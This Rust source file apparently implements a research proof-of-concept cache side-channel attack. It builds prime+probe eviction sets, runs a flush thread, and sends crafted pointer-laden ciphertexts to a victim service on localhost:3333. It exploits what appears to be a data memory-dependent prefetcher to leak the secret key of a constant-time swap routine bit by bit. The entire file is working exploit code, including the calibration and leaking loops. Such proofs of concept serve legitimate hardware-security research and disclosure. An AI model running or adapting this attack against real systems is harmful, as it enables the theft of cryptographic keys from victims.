use crypto_attacker::*;
use libaugury_ffi_sys::{c_sleep, pin_cpu, flush_evset};
// std lib
use std::env::args;
use std::mem::size_of;
use std::sync::atomic::Ordering;
use std::sync::atomic::compiler_fence;
use std::net::{TcpStream};
use std::io::{Read, Write};
use std::sync::mpsc::{self, TryRecvError};
use std::thread;
use std::time::Instant;
// random value lib
use rand::{Rng, thread_rng};
// file lib
use std::fs::{File, read_to_string};
// mmap lib
use mmap_rs::MmapOptions;
// P+P lib
use evict_rs::timer::Timer;
use evict_rs::MyTimer;
use evict_rs::{eviction_set_gen64,
    prime_with_dependencies, probe_with_dependencies, 
    evset_vec_to_evset, evset_vec_set_offset};
use evict_rs::allocator::Allocator;
use evict_rs::eviction_set::EvictionSet;


fn ctswap_hacker(
    mut stream: TcpStream,
    victim_array_cache_lines: &mut Vec<*mut u8>,
    repetitions: usize,
    pp_threshold: u64,
    num_group: usize,
    flush_ptr: *mut u64,
    victim_cl_start: u64,
    victim_cl_end: u64,
    dst_buf_offset: u64,
    timer: &MyTimer,
    mut bench_time_file: &File
) {
    let mut __trash: u64 = 0;
    let mut test_time: u64;
    let mut msg_data = [0u8; 1];
    let mut zero_data = [0u8; 128];
    let mut ptr_data = [0u8; 128];
    let ptr_data_ptr: *mut u64 = ptr_data.as_mut_ptr() as *mut u64;
    let mut rng = thread_rng();

    // --------------------------------Calibration-----------------------------
    println!("--------------------------------Calibration-----------------------------");
    // Try different combination of ptr sequence / flush thread / p+p evset
    let mut target_addr: u64 = 0;
    let flush_ptr_value: u64 = flush_ptr as u64;
    let mut global_pp_idx: usize = 0;
    let mut pp_idx = 0;

    // Contention detection
    let mut non_conflict_set = vec![];
    let mut target_ptr_offset: u64;
    let mut offest_trials: u64 = 0;
    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, dst_buf_offset as usize, 
        0, NUM_EVSETS/num_group, flush_ptr);
    // create flush thread
    let (tx, rx) = mpsc::channel();
    let _handle = thread::spawn(move || {
        unsafe{ pin_cpu(5); }
        loop {
            unsafe{ flush_evset(flush_ptr_value as *mut u64, (NUM_EVSETS / num_group * L2_CACHE_WAYS) as u32); }

            match rx.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    match rx.recv() {
                        Ok(_) => {},
                        Err(_) => {break;}
                    }
                },
                Err(TryRecvError::Empty) => {}
            };
        };
    });
    // Stop flush thread
    __trash = match tx.send(__trash) {
        Ok(_) => {unsafe{ c_sleep(0, __trash) }},
        Err(_) => {panic!("Send Error");}
    };
    println!("[+] Flush thread is created!");
    let cevset_now = Instant::now();
    loop {
        target_ptr_offset = rng.gen::<u64>() & 0x3f80;
        if target_ptr_offset == dst_buf_offset {
            println!("The same as victim array offset!");
            continue;
        }
        println!("[+] Set Target Pointer Offset as {:#x}", target_ptr_offset);
        // divide evset group into conflict and non-conflict
        let mut conflict_times: u64 = 0;
        let mut conflict_set = vec![];
        for i in 0..NUM_EVSETS {
            // one iteration
            // fetch prime+probe evset
            let mut result_evset: Vec<*mut u8> = Vec::new();
            evset_vec_to_evset(&victim_array_cache_lines, 
                &mut result_evset, L2_CACHE_WAYS, target_ptr_offset as usize, i);
            let evset_victim_buf = EvictionSet::new(&mut result_evset);

            let mut times_to_load_test_ptr_atk = vec![];

            // test one prime+probe evset
            for _ in 0..repetitions {
                // send request
                msg_data[0] = !(__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();

                // receive pubkey from victim (here it is only a garbage msg)
                stream.read_exact(&mut msg_data).unwrap();

                // Resume flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };
    
                compiler_fence(Ordering::SeqCst);

                __trash += msg_data[0] as u64;

                compiler_fence(Ordering::SeqCst);
                __trash = unsafe{c_sleep(1500000, __trash)};

                compiler_fence(Ordering::SeqCst);
                __trash = prime_with_dependencies(&evset_victim_buf, __trash);
                zero_data[0] = zero_data[0] | (__trash & MSB_MASK) as u8;
                // send cipher text
                stream.write_all(&zero_data).unwrap();

                // receive finish signal
                stream.read_exact(&mut msg_data).unwrap();
                __trash += msg_data[0] as u64;
                // Stop flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };
                compiler_fence(Ordering::SeqCst);

                // measure microarchitectural state
                test_time = probe_with_dependencies(timer, &evset_victim_buf, __trash);
                times_to_load_test_ptr_atk.push(test_time);
            }
            times_to_load_test_ptr_atk.sort();
            let median_test = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
            if median_test >= pp_threshold {
                conflict_times += 1;
                conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            } else {
                non_conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            }
        }
        println!("[+] Conflict set: {}; Non-conflict set: {}", conflict_set.len(), non_conflict_set.len());

        if non_conflict_set.len() <= 5 {
            println!("Number of Non-conflict set is not enough, try different page offset for target pointer");
            non_conflict_set.clear();
            offest_trials += 1;
            if offest_trials >= 3 {
                msg_data[0] = (__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();
                panic!("3 times bad conflict tests!");
            }
        } else {
            break;
        }
    }

    // Try different gadget settings
    let mut gadget_flag = 0;
    while pp_idx < non_conflict_set.len() {
        // fix prime+probe channel
        let mut pp_evset_vec_cur: Vec<*mut u8> = Vec::new();
        evset_vec_to_evset(&victim_array_cache_lines, 
            &mut pp_evset_vec_cur, L2_CACHE_WAYS, target_ptr_offset as usize, non_conflict_set[pp_idx]);
        global_pp_idx = non_conflict_set[pp_idx];
        assert_eq!(pp_evset_vec_cur.len(), L2_CACHE_WAYS);
        let pp_evset = EvictionSet::new(&mut pp_evset_vec_cur);
        println!("[+] P+P Evset {} Fixed!", pp_idx);

        let mut pp_bad_flag = 0;

        // try different target addr
        let mut target_addr_page = victim_cl_start;
        let mut num_target_addr_tries = 0;
        while target_addr_page < victim_cl_end {
            target_addr = target_addr_page + target_ptr_offset;
            num_target_addr_tries += 1;
            println!("[+] Try {}: Pick Target addr:{:#x} for P+P set {}", num_target_addr_tries, target_addr, pp_idx);
            // Fill pointer
            for i in 0..16 {
                unsafe{*ptr_data_ptr.add(i) = target_addr;}
            }

            let mut flush_group_idx = 0;
            let mut noise_times = 0;
            let mut succeed_times = 0;
            while flush_group_idx < num_group {
                let now = Instant::now();
                evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
                    dst_buf_offset as usize,
                    flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
                println!("[+] Group {}:", flush_group_idx);

                // Initial vectors to store results
                let mut times_to_load_test_ptr_base = vec![];
                let mut times_to_load_test_ptr_atk = vec![];
                // Initial mode
                let mut mode: u8 = 0;

                for _ in 0..repetitions*2 {
                    // send request
                    msg_data[0] = !(__trash & MSB_MASK) as u8;
                    stream.write_all(&msg_data).unwrap();
        
                    // receive pubkey from victim
                    stream.read_exact(&mut msg_data).unwrap();
    
                    // Chose ptr or not
                    let ct_ptr = match mode {
                        0 => &mut ptr_data,
                        0xff => &mut zero_data,
                        _ => panic!("Unexpected mode during calibration!"),
                    };

                    // Resume flush thread
                    __trash = match tx.send(__trash) {
                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                        Err(_) => {panic!("Send Error");}
                    };
        
                    compiler_fence(Ordering::SeqCst);
                    __trash = unsafe{c_sleep(1500000, __trash)};
        
                    compiler_fence(Ordering::SeqCst);
                    __trash = prime_with_dependencies(&pp_evset, __trash);
                    ct_ptr[0] = ct_ptr[0] | (__trash & MSB_MASK) as u8;
        
                    // send cipher text
                    stream.write_all(ct_ptr).unwrap();
        
                    // receive finish signal
                    stream.read_exact(&mut msg_data).unwrap();
                    __trash += msg_data[0] as u64;

                    // Stop flush thread
                    __trash = match tx.send(__trash) {
                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                        Err(_) => {panic!("Send Error");}
                    };
                    compiler_fence(Ordering::SeqCst);
        
                    // measure microarchitectural state
                    test_time = probe_with_dependencies(timer, &pp_evset, __trash);
                    __trash = test_time | (__trash & MSB_MASK);
                    // store result
                    if mode==0 {
                        times_to_load_test_ptr_atk.push(test_time);
                    } else {
                        times_to_load_test_ptr_base.push(test_time);
                    }
            
                    mode = !(mode | (__trash & MSB_MASK) as u8);
                }
                times_to_load_test_ptr_atk.sort();
                times_to_load_test_ptr_base.sort();
                let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
                let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
                println!("Attack mode: {}", median_test_atk);
                println!("Base mode: {}", median_test_base);

                // only if atk mode activate DMP but base mode does not
                if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
                    succeed_times += 1;
                    noise_times = 0;
                    println!("[+] Get Signal ({})", succeed_times);
                    if succeed_times >= 3 {
                        gadget_flag = 1;
                        println!("[+] Get Attack Gadgets!");
                        break;
                    }
                } else if median_test_base >= pp_threshold {
                    noise_times += 1;
                    succeed_times = 0;
                    println!("[+] Noise Test Environment {}", noise_times);
                    if noise_times >= 3 {
                        println!("[+] Try different P+P Evset!");
                        pp_bad_flag = 1;
                        break;
                    }
                } else {
                    succeed_times = 0;
                    noise_times = 0;
                    println!("[+] No signal");
                    flush_group_idx += 1;
                }
                let trans_dur = now.elapsed();
                println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
                    trans_dur.subsec_nanos());
            }
            if (pp_bad_flag == 1) || (gadget_flag == 1) {
                break;
            }
            target_addr_page += NATIVE_PAGE_SIZE as u64;
        }
        if gadget_flag == 1 {
            break;
        }
        pp_idx += 1;
    }

    let mut pp_evset_vec: Vec<*mut u8> = Vec::new();
    evset_vec_to_evset(&victim_array_cache_lines, 
        &mut pp_evset_vec, L2_CACHE_WAYS, target_ptr_offset as usize, global_pp_idx);
    let pp_evset = EvictionSet::new(&mut pp_evset_vec);
    write!(bench_time_file, "Compound Evset finding time: {} s\n", cevset_now.elapsed().as_secs()).unwrap();

    // --------------------------------Start Leaking-----------------------------
    println!("--------------------------------Start Leaking-----------------------------");
    let measure_times = 100;

    // prepare pointer
    // Fill pointer
    for i in 0..8 {
        unsafe{*ptr_data_ptr.add(i) = target_addr;}
    }
    for i in 8..16 {
        unsafe{*ptr_data_ptr.add(i) = 0;}
    }

    let mut result_file = File::create("ctswap.txt").unwrap();
    let mut valid_measure_idx = 0;
    while valid_measure_idx < measure_times {
        let now = Instant::now();
        // measure
        // Initial vectors to store results
        let mut times_to_load_test_ptr_base = vec![];
        let mut times_to_load_test_ptr_atk = vec![];
        // Initial mode
        let mut mode: u8 = 0;

        for _ in 0..repetitions*2 {
            // send request
            msg_data[0] = !(__trash & MSB_MASK) as u8;
            stream.write_all(&msg_data).unwrap();

            // receive pubkey from victim
            stream.read_exact(&mut msg_data).unwrap();

            // Chose ptr or not
            let ct_ptr = match mode {
                0 => &mut ptr_data,
                0xff => &mut zero_data,
                _ => panic!("Unexpected mode during calibration!"),
            };

            // Resume flush thread
            __trash = match tx.send(__trash) {
                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                Err(_) => {panic!("Send Error");}
            };

            compiler_fence(Ordering::SeqCst);
            __trash = unsafe{c_sleep(1500000, __trash)};

            compiler_fence(Ordering::SeqCst);
            __trash = prime_with_dependencies(&pp_evset, __trash);
            ct_ptr[0] = ct_ptr[0] | (__trash & MSB_MASK) as u8;

            // send cipher text
            stream.write_all(ct_ptr).unwrap();

            // receive finish signal
            stream.read_exact(&mut msg_data).unwrap();
            __trash += msg_data[0] as u64;

            // Stop flush thread
            __trash = match tx.send(__trash) {
                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                Err(_) => {panic!("Send Error");}
            };
            compiler_fence(Ordering::SeqCst);

            // measure microarchitectural state
            test_time = probe_with_dependencies(timer, &pp_evset, __trash);
            __trash = test_time | (__trash & MSB_MASK);
            // store result
            if mode==0 {
                times_to_load_test_ptr_atk.push(test_time);
            } else {
                times_to_load_test_ptr_base.push(test_time);
            }
    
            mode = !(mode | (__trash & MSB_MASK) as u8);
        }
        times_to_load_test_ptr_atk.sort();
        times_to_load_test_ptr_base.sort();
        let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
        let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
        println!("Attack mode: {}", median_test_atk);
        println!("Base mode: {}", median_test_base);
        if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
            println!("[+] Secret Key is 1!");
        } else if median_test_base >= pp_threshold {
            println!("[+] Noisy Measuremnts!");
        } else {
            println!("[+] Secret Key is 0!");
        }

        let trans_dur = now.elapsed();
        println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
            trans_dur.subsec_nanos());

        for measure_idx in 0..repetitions {
            write!(result_file, "{}\n", 
                times_to_load_test_ptr_atk[measure_idx]).unwrap();
        }
        valid_measure_idx += 1;
        println!("[+] measure times: {}", valid_measure_idx);
    }

    // disconnect the transaction
    msg_data[0] = (__trash & MSB_MASK) as u8;
    stream.write_all(&msg_data).unwrap();

}

fn main() {
    let repetitions = args().nth(1).expect("Enter <repetitions>");
    let pp_threshold = args().nth(2).expect("Enter <prime+probe channel threshold>");
    let num_group = args().nth(3).expect("Enter <number of flush thread group to try>");

    let repetitions = repetitions.parse::<usize>().unwrap();
    let pp_threshold = pp_threshold.parse::<u64>().unwrap();
    let num_group = num_group.parse::<usize>().unwrap();
    assert_eq!(NUM_EVSETS % num_group, 0);

    // load dst array page offset
    let dst_buf_offset_str: Vec<String> = read_to_string("ctswap_addr.txt").unwrap().lines().map(String::from).collect();
    let dst_buf_offset = match u64::from_str_radix(&(dst_buf_offset_str[0][2..]), 16) {
        Ok(result) => result & 0x3f80,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };

    // load prefetch target search range
    let dyld_space_str: Vec<String> = read_to_string("dyld_space.txt").unwrap().lines().map(String::from).collect();
    println!("[+] Grab dyld search space from file...");
    let victim_cl_start = match u64::from_str_radix(&(dyld_space_str[0][2..]), 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };
    let victim_cl_end = match u64::from_str_radix(&(dyld_space_str[1][2..]), 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };

    println!("[+] Dst Array page offset -> {:#x}", dst_buf_offset);
    println!("[+] Target Pointer start frame -> {:#x}", victim_cl_start);
    println!("[+] Target Pointer end frame -> {:#x}", victim_cl_end);

    unsafe{ pin_cpu(4); }

    // Allocate Precise Flush buffer
    let size_of_flush_buf: usize = size_of::<u64>() * (NUM_EVSETS/num_group) * L2_CACHE_WAYS;
    // Allocate via mmap
    let mut flush_buf_addr = MmapOptions::new(size_of_flush_buf)
        .map_mut()
        .unwrap();
    assert_eq!(size_of_flush_buf, flush_buf_addr.len());

    let flush_bytes = unsafe {
        core::slice::from_raw_parts_mut(
            flush_buf_addr.as_mut_ptr() as *mut u8,
            flush_buf_addr.len(),
        )
    };
    flush_bytes.fill(0x00);

    let flush_ptr = flush_buf_addr.as_mut_ptr() as *mut u64;

    // prepare 64 eviction set groups
    let mut bench_time_file = File::create("ctswap_bench.txt").unwrap();
    println!("--------------------------------Evsets Preparation-----------------------------");
    let gen64_now = Instant::now();
    let timer = MyTimer::new();
    let mut victim_array_cache_lines: Vec<*mut u8> = Vec::new();
    let mut allocator = Allocator::new(0, NATIVE_PAGE_SIZE);
    eviction_set_gen64(&mut allocator, &mut victim_array_cache_lines, &timer);
    write!(bench_time_file, "64 evset gen time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();

    match TcpStream::connect("localhost:3333") {
        Ok(stream) => {
            println!("Successfully connected to server in port 3333");
            ctswap_hacker(stream, &mut victim_array_cache_lines, 
                repetitions, pp_threshold, num_group, flush_ptr, 
                victim_cl_start, victim_cl_end, dst_buf_offset, &timer, &bench_time_file);
        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
    println!("Terminated.");
}